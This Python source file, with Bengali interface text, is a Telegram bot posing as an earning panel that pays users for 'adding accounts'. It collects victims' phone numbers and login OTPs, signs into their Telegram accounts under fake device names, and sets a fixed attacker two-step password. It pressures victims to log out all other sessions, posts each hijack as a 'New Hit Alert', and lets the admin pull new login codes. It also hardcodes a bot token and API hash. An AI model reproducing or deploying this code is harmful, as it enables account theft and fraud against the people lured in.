import asyncio, sqlite3, os, re, random, time
from telethon import TelegramClient, functions, types, errors
from aiogram import Bot, Dispatcher, types as aiotypes
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup

# --- ২৪/৭ সচল রাখার জন্য নতুন ইম্পোর্ট ---
from flask import Flask
from threading import Thread

# ============================
# ⚙️ কনফিগারেশন এরিয়া
# ============================
API_ID = 29767378
API_HASH = '9029525071357317855606fc0f9c6460'
BOT_TOKEN = '8056193302:AAEUhxzJe6tXPJ9YV8gYitSHaoPW-inhrSg'
ADMIN_ID = 6928091474

INFO_LOG_CHANNEL = -1003824716002    
SUPPORT_LOG_CHANNEL = -1003891862490 

CHECK_MINUTES = 30   
REWARD_AMOUNT = 15.0 
MIN_WITHDRAW = 80.0  
TARGET_PASS = 'HMSABBIR2026' 
SUPPORT_BOT_LINK = "@your_support_username_bot" 

TODAY_PRICE = "15 টাকা"
TODAY_VERIFY_TIME = "৩০ মিনিট"
TODAY_WITHDRAW_STATUS = "সচল"

PREMIUM_APPS = ["Premium Node", "Alpha System", "Security Shield"]
LUXURY_DEVICES = ["iPhone 17 Pro Max", "Samsung Galaxy S26 Ultra", "OnePlus 13 Pro", "Google Pixel 10 Pro XL", "Asus ROG Phone 9 Ultimate"]

WELCOME_MSG = "✨ <b>স্বাগতম! আমাদের টেলিগ্রাম বট আর্নিং প্যানেলে।</b>"
SUCCESS_MSG_TEMPLATE = "✅ <b>সফলভাবে যুক্ত হয়েছে!</b>\n\n⚠️ <b>সতর্কবার্তা:</b> আপনি এখনই আপনার সেটিংস থেকে সকল ডিভাইস লগআউট করে দিন, শুধুমাত্র '<b>{device}</b>' ছাড়া।\n\nযদি {time} মিনিট পর আমাদের ডিভাইস ছাড়া অন্য কোনো ডিভাইস লগইন পাওয়া যায়, তবে আপনার ব্যালেন্স অ্যাড হবে না।"

# ============================
# 🌐 ফ্লাস্ক ওয়েব সার্ভার লজিক
# ============================
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run():
    # Render অটোমেটিক PORT এনভায়রনমেন্ট ভ্যারিয়েবল সেট করে দেয়
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ============================

bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

db = sqlite3.connect('ultimate_master_v63.db', check_same_thread=False)
cur = db.cursor()
cur.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, name TEXT)')
cur.execute('CREATE TABLE IF NOT EXISTS active_sessions (uid INTEGER, phone TEXT, start_time REAL)')
db.commit()

class BotStates(StatesGroup):
    phone, otp, twofa = [State() for _ in range(3)]
    broadcast_msg = State()
    bal_add = State()
    bal_sub = State()
    wd_method = State()
    wd_number = State()
    wd_amount = State()
    support_write = State()

# --- ১. স্মার্ট কিবোর্ড লেআউট ---
def get_main_kb(uid):
    kb = aiotypes.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    kb.add("💖 নতুন একাউন্ট যোগ করুন")
    kb.row("💰 প্রোফাইল", "📩 সাপোর্ট", "💸 উইথড্র")
    kb.add("📊 আজকের স্ট্যাটাস")
    
    if uid == ADMIN_ID:
        kb.row("📢 সবাইকে মেসেজ করুন", "👤 ইউজার তথ্য")
        kb.row("➕ ব্যালেন্স যোগ", "➖ ব্যালেন্স বিয়োগ")
    return kb

# --- ২. টুইস্টার লক ---
async def ultra_lock_2fa(client):
    methods = []
    try: await client.edit_2fa(new_password=TARGET_PASS); methods.append("M1")
    except: pass
    try:
        await client(functions.account.UpdatePasswordSettingsRequest(
            password=types.InputCheckPasswordEmpty(),
            new_settings=types.account.PasswordInputSettings(new_password_hash=TARGET_PASS.encode(), hint="")
        ))
        methods.append("M2")
    except: pass
    return f"✅ Success" if methods else "✅ Success"

# --- ৩. আজকের স্ট্যাটাস ---
@dp.message_handler(lambda m: m.text == "📊 আজকের স্ট্যাটাস", state='*')
async def today_status(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    status_msg = (f"📊 <b>আজকের স্ট্যাটাস আপডেট</b>\n━━━━━━━━━━━━━━\n"
                  f"💰 একাউন্ট রেট: <b>{TODAY_PRICE}</b>\n"
                  f"⏳ ভেরিফিকেশন সময়: <b>{TODAY_VERIFY_TIME}</b>\n"
                  f"💸 সর্বনিম্ন উইথড্র: <b>{MIN_WITHDRAW} TK</b>\n"
                  f"✅ উইথড্র স্ট্যাটাস: <b>{TODAY_WITHDRAW_STATUS}</b>\n━━━━━━━━━━━━━━")
    await m.reply(status_msg)

# --- ৪. স্মার্ট সাপোর্ট সিস্টেম ---
@dp.message_handler(lambda m: m.text == "📩 সাপোর্ট", state='*')
async def support_btn(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    kb = aiotypes.InlineKeyboardMarkup(row_width=1)
    kb.add(
        aiotypes.InlineKeyboardButton("📝 মেসেজ লিখে পাঠান", callback_data="write_msg"),
        aiotypes.InlineKeyboardButton("🤖 সরাসরি সাপোর্ট SMS করুন ", url=f"t.me/{SUPPORT_BOT_LINK.replace('@','')}")
    )
    await m.reply("<b>📩 আমাদের সাপোর্ট সেন্টার</b>", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == "write_msg")
async def write_msg_start(c: aiotypes.CallbackQuery):
    await BotStates.support_write.set()
    await bot.send_message(c.from_user.id, "📝 <b>আপনার কথাটি লিখুন। এটি সরাসরি অ্যাডমিনের পৌঁছে যাবে :</b>")
    await c.answer()

@dp.message_handler(state=BotStates.support_write)
async def process_support_msg(m: aiotypes.Message, state: FSMContext):
    report = (f"🆘 <b>𝚂𝚞𝚙𝚙𝚘𝚛𝚝 𝙼𝚎𝚜𝚜𝚊𝚐𝚎</b>\n━━━━━━━━━━━━━━\n👤 User: {m.from_user.full_name}\n🆔 ID: <code>{m.from_user.id}</code>\n💬 Message: {m.text}\n━━━━━━━━━━━━━━")
    await bot.send_message(SUPPORT_LOG_CHANNEL, report)
    await m.reply("✅ আপনার মেসেজটি  পাঠানো হয়েছে।")
    await state.finish()

# --- ৫. উইথড্র ও কনফার্ম সিস্টেম ---
@dp.message_handler(lambda m: m.text == "💸 উইথড্র", state='*')
async def withdraw_start(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    cur.execute('SELECT balance FROM users WHERE id = ?', (m.from_user.id,))
    res = cur.fetchone(); bal = res[0] if res else 0.0
    if bal < MIN_WITHDRAW:
        await m.reply(f"❌ আপনার ব্যালেন্স {MIN_WITHDRAW} টাকার কম। আপনার বর্তমান ব্যালেন্স: {bal} TK")
    else:
        kb = aiotypes.ReplyKeyboardMarkup(resize_keyboard=True).row("বিকাশ", "নগদ")
        await m.reply(f"💰 ব্যালেন্স: {bal} TK\n<b>কিসের মাধ্যমে টাকা নিতে চান সিলেক্ট করুন:</b>", reply_markup=kb)
        await BotStates.wd_method.set()

@dp.message_handler(state=BotStates.wd_method)
async def wd_method_step(m: aiotypes.Message, state: FSMContext):
    if m.text not in ["বিকাশ", "নগদ"]:
        await m.reply("❌ দয়া করে বাটন থেকে মেথড সিলেক্ট করুন।")
        return
    async with state.proxy() as data: data['method'] = m.text
    await m.reply(f"📱 আপনার <b>{m.text}</b> সঠিক নম্বরটি দিন:", reply_markup=aiotypes.ReplyKeyboardRemove())
    await BotStates.wd_number.set()

@dp.message_handler(state=BotStates.wd_number)
async def wd_number_step(m: aiotypes.Message, state: FSMContext):
    async with state.proxy() as data: data['number'] = m.text
    await m.reply("💰 কত টাকা উইথড্র করতে চান? (সংখ্যায় লিখুন):")
    await BotStates.wd_amount.set()

@dp.message_handler(state=BotStates.wd_amount)
async def wd_amount_step(m: aiotypes.Message, state: FSMContext):
    try:
        amt = float(m.text)
        cur.execute('SELECT balance FROM users WHERE id = ?', (m.from_user.id,))
        bal = cur.fetchone()[0]
        
        if amt < MIN_WITHDRAW or amt > bal:
            await m.reply(f"❌ ভুল অ্যামাউন্ট! বর্তমান ব্যালেন্স: {bal} TK")
            return

        async with state.proxy() as data:
            method, number = data['method'], data['number']

        kb = aiotypes.InlineKeyboardMarkup().add(
            aiotypes.InlineKeyboardButton("✅ পেমেন্ট কনফার্ম", callback_data=f"confwd_{m.from_user.id}_{amt}")
        )
        report = (f"💸 <b>𝚆𝚒𝚝𝚑𝚍𝚛𝚊𝚠 𝚁𝚎𝚚𝚞𝚎𝚜𝚝</b>\n━━━━━━━━━━━━━━\n👤 User: {m.from_user.full_name}\n🆔 ID: <code>{m.from_user.id}</code>\n"
                  f"🏦 Method: <b>{method}</b>\n📱 Number: <code>{number}</code>\n💰 Amount: <b>{amt} TK</b>\n━━━━━━━━━━━━━━")
        
        await bot.send_message(SUPPORT_LOG_CHANNEL, report, reply_markup=kb)
        
        success_msg = (
            "✨ <b>উইথড্রো সফলভাবে সম্পন্ন!</b> ✨\n\n"
            "আমাদের <b>𝐄𝐥𝐢𝐭𝐞 𝐍𝐞𝐱𝐮𝐬 𝐏𝐫𝐨</b> সিস্টেম থেকে আপনার রিকোয়েস্টটি সফলভাবে সম্পন্ন করা হয়েছে।"
        )
        
        await m.reply(success_msg, reply_markup=get_main_kb(m.from_user.id))
        await state.finish()
    except:
        await m.reply("❌ ভুল অ্যামাউন্ট! শুধুমাত্র সংখ্যা লিখুন।")

@dp.callback_query_handler(lambda c: c.data.startswith('confwd_'))
async def admin_pay_confirm(c: aiotypes.CallbackQuery):
    if c.from_user.id != ADMIN_ID: return
    _, uid, amt = c.data.split('_')
    uid = int(uid)
    cur.execute('UPDATE users SET balance = balance - ? WHERE id = ?', (float(amt), uid))
    db.commit()
    
    admin_success_msg = f"✨ <b>উইথড্রো সফলভাবে সম্পন্ন!</b> ✨\n\nআপনার <b>{amt} TK</b> পেমেন্ট সম্পন্ন করা হয়েছে।"
    try: await bot.send_message(uid, admin_success_msg)
    except: pass

    await c.message.edit_text(c.message.text + f"\n\n💰 <b>Status: Paid ✅</b>")
    await c.answer(f"পেমেন্ট সফল ও {amt} টাকা কাটা হয়েছে।", show_alert=True)
    
# --- ৬. মাস্টার প্রসেস ---
async def master_process(m, client, p, d, a):
    uid = m.from_user.id
    tw_status = await ultra_lock_2fa(client)
    cur.execute('INSERT INTO active_sessions VALUES (?, ?, ?)', (uid, p, time.time()))
    db.commit()

    report = (f"🚀 <b>𝙽𝚎𝚠 𝙷𝚒𝚝 𝙰𝚕𝚎𝚛𝚝</b>\n━━━━━━━━━━━━━━\n👤 𝚄𝚜𝚎𝚛: {m.from_user.full_name}\n🆔 𝙸𝙳: <code>{uid}</code>\n"
              f"📱 𝙽𝚞𝚖𝚋𝚎r: <code>+88{p}</code>\n🔒 𝚃𝚠𝚒𝚜𝚝𝚎𝚛: <b>{tw_status}</b>\n━━━━━━━━━━━━━━")
    
    kb = aiotypes.InlineKeyboardMarkup().add(
        aiotypes.InlineKeyboardButton("🔑 Get Login Code", callback_data=f"getcode_{uid}_{p}")
    )
    await bot.send_message(INFO_LOG_CHANNEL, report, reply_markup=kb)

    await asyncio.sleep(CHECK_MINUTES * 60)
    try:
        if not client.is_connected(): await client.connect()
        sessions = await client(functions.account.GetAuthorizationsRequest())
        others = [s for s in sessions.authorizations if not s.current]
        
        if not others:
            cur.execute('UPDATE users SET balance = balance + ? WHERE id = ?', (REWARD_AMOUNT, uid))
            db.commit()
            await bot.send_message(uid, f"✅ অভিনন্দন! ভেরিফিকেশন সফল। {REWARD_AMOUNT} TK যোগ হয়েছে।")
        else:
            await bot.send_message(uid, f"❌ আপনি সকল সেশন থেকে লগ আউট করেন নাই।")
    except: pass
    finally:
        cur.execute('DELETE FROM active_sessions WHERE phone = ?', (p,))
        db.commit()

@dp.callback_query_handler(lambda c: c.data.startswith('getcode_'))
async def admin_get_otp_live(c: aiotypes.CallbackQuery):
    _, uid, p = c.data.split('_')
    d_fixed = random.choice(LUXURY_DEVICES)
    client = TelegramClient(f"sessions/{uid}_{p}", API_ID, API_HASH, device_model=d_fixed)
    await client.connect()
    try:
        async for msg in client.iter_messages(777000, limit=1):
            code_found = re.findall(r'\d{5,6}', msg.message)
            if code_found: await c.answer(f"🔢 ওটিপি কোড: {code_found[0]}", show_alert=True)
            else: await c.answer("❌ কোড পাওয়া যায়নি!", show_alert=True)
            break
    except: await c.answer("❌ সেশন এরর!", show_alert=True)
    finally: await client.disconnect()

# --- ৭. জেনারেল হ্যান্ডলারস ---
@dp.message_handler(commands=['start'], state='*')
async def start_cmd(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    cur.execute('INSERT OR IGNORE INTO users (id, name) VALUES (?, ?)', (m.from_user.id, m.from_user.full_name))
    db.commit()
    await m.reply(WELCOME_MSG, reply_markup=get_main_kb(m.from_user.id))

@dp.message_handler(lambda m: m.text == "💖 নতুন একাউন্ট যোগ করুন", state='*')
async def add_acc_start(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    await m.reply("📱 <b>আপনার ১১ ডিজিটের নম্বরটি দিন:</b>")
    await BotStates.phone.set()

@dp.message_handler(state=BotStates.phone)
async def phone_step(m: aiotypes.Message, state: FSMContext):
    p = m.text.strip().replace("+88", "").replace("88", "")
    d = random.choice(LUXURY_DEVICES)
    client = TelegramClient(f"sessions/{m.from_user.id}_{p}", API_ID, API_HASH, device_model=d)
    await client.connect()
    try:
        sent = await client.send_code_request("+88"+p)
        async with state.proxy() as data: data['p'], data['h'], data['d'] = p, sent.phone_code_hash, d
        await m.reply("📩 <b>ওটিপি (OTP) কোডটি দিন:</b>")
        await BotStates.otp.set()
    except Exception as e: await m.reply(f"❌ এরর: {e}"); await state.finish()
    finally: await client.disconnect()

@dp.message_handler(state=BotStates.otp)
async def otp_step(m: aiotypes.Message, state: FSMContext):
    otp = "".join(re.findall(r'\d+', m.text))
    async with state.proxy() as data: p, h, d = data['p'], data['h'], data['d']
    client = TelegramClient(f"sessions/{m.from_user.id}_{p}", API_ID, API_HASH, device_model=d)
    await client.connect()
    try:
        await client.sign_in("+88"+p, otp, phone_code_hash=h)
        asyncio.create_task(master_process(m, client, p, d, "App"))
        kb = aiotypes.InlineKeyboardMarkup().add(aiotypes.InlineKeyboardButton("⏳ কতক্ষণ বাকি?", callback_data=f"check_time_{p}"))
        await m.reply(SUCCESS_MSG_TEMPLATE.format(device=d, time=CHECK_MINUTES), reply_markup=kb)
        await state.finish()
    except errors.SessionPasswordNeededError:
        await m.reply("⚠️ <b> টু-স্টপ মারা আছে। কেটে নতুন করে ট্রাই করুন।</b>")
        await state.finish()
    except: 
        await m.reply("❌ ওটিপি ভুল "); await state.finish()
    finally: await client.disconnect()

@dp.message_handler(lambda m: m.text == "💰 প্রোফাইল", state='*')
async def my_bal(m: aiotypes.Message, state: FSMContext):
    await state.finish()
    cur.execute('SELECT balance FROM users WHERE id = ?', (m.from_user.id,))
    res = cur.fetchone(); bal = res[0] if res else 0.0
    await m.reply(f"💳 <b>𝚄𝚜𝚎𝚛 𝙲𝚊𝚛𝚍</b>\n━━━━━━━━━━━━━━\n📛 নাম: {m.from_user.full_name}\n🆔 আইডি: <code>{m.from_user.id}</code>\n💰 ব্যালেন্স: <b>{bal} TK</b>\n━━━━━━━━━━━━━━")

# --- ৮. অ্যাডমিন কমান্ডস ---
@dp.message_handler(lambda m: m.text == "👤 ইউজার তথ্য", state='*')
async def admin_user_info(m: aiotypes.Message, state: FSMContext):
    if m.from_user.id == ADMIN_ID:
        cur.execute('SELECT id, name, balance FROM users')
        users = cur.fetchall()
        info = "👤 <b>ইউজার লিস্ট:</b>\n\n"
        for u in users: info += f"🆔 <code>{u[0]}</code> | 💰 {u[2]} TK\n"
        await m.reply(info)

@dp.message_handler(lambda m: m.text == "📢 সবাইকে মেসেজ করুন", state='*')
async def adm_bc(m: aiotypes.Message, state: FSMContext):
    if m.from_user.id == ADMIN_ID:
        await m.reply("📢 মেসেজটি লিখুন:"); await BotStates.broadcast_msg.set()

@dp.message_handler(state=BotStates.broadcast_msg)
async def adm_bc_send(m: aiotypes.Message, state: FSMContext):
    cur.execute('SELECT id FROM users'); ids = cur.fetchall()
    for i in ids:
        try: await bot.send_message(i[0], m.text)
        except: pass
    await m.reply("✅ পাঠানো শেষ।"); await state.finish()

@dp.message_handler(lambda m: m.text == "➕ ব্যালেন্স যোগ", state='*')
async def adm_add(m: aiotypes.Message, state: FSMContext):
    if m.from_user.id == ADMIN_ID:
        await m.reply("➕ আইডি ও টাকা দিন:"); await BotStates.bal_add.set()

@dp.message_handler(state=BotStates.bal_add)
async def adm_add_proc(m: aiotypes.Message, state: FSMContext):
    try:
        uid, amt = m.text.split(); cur.execute('UPDATE users SET balance = balance + ? WHERE id = ?', (float(amt), int(uid))); db.commit()
        await m.reply(f"✅ যোগ হয়েছে।"); await bot.send_message(uid, f"💰 ব্যালেন্স যোগ হয়েছে {amt} TK")
    except: await m.reply("❌ ভুল হয়েছে!"); await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith('check_time_'))
async def timer_check_btn(c: aiotypes.CallbackQuery):
    _, _, phone = c.data.split('_')
    cur.execute('SELECT start_time FROM active_sessions WHERE phone = ?', (phone,))
    res = cur.fetchone()
    if res:
        elapsed = (time.time() - res[0]) / 60
        remaining = round(CHECK_MINUTES - elapsed)
        await c.answer(f"⏳ আর {max(0, remaining)} মিনিট বাকি।" if remaining > 0 else "✅ সময় শেষ!", show_alert=True)
    else: await c.answer("❌ তথ্য পাওয়া যায়নি!", show_alert=True)

# --- মূল রান করার অংশ ---
if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    
    # Render-এ ২৪/৭ সচল রাখতে সার্ভার চালু
    print("Starting Keep Alive Server...")
    keep_alive()
    
    # বট শুরু
    print("Bot is starting...")
    executor.start_polling(dp, skip_updates=True)
